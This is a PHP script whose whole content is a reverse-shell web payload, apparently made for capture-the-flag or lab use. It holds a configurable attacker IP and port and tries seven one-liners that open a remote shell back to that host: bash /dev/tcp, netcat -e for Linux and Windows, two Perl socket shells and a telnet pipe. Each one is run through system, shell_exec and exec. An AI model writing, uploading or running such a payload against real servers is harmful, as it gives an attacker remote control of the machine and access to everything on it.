<?php
echo 'running shell';
$ip='10.10.14.84';   #Change this
$port='1234';
$reverse_shells = array(
    '/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
    '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
    '/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',
    'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',
    "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',
    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
);
foreach ($reverse_shells as $reverse_shell) {
   try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}
   try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}
   try {exec($reverse_shell);} catch (Exception $e) {echo $e;}
}
system('id');
?>
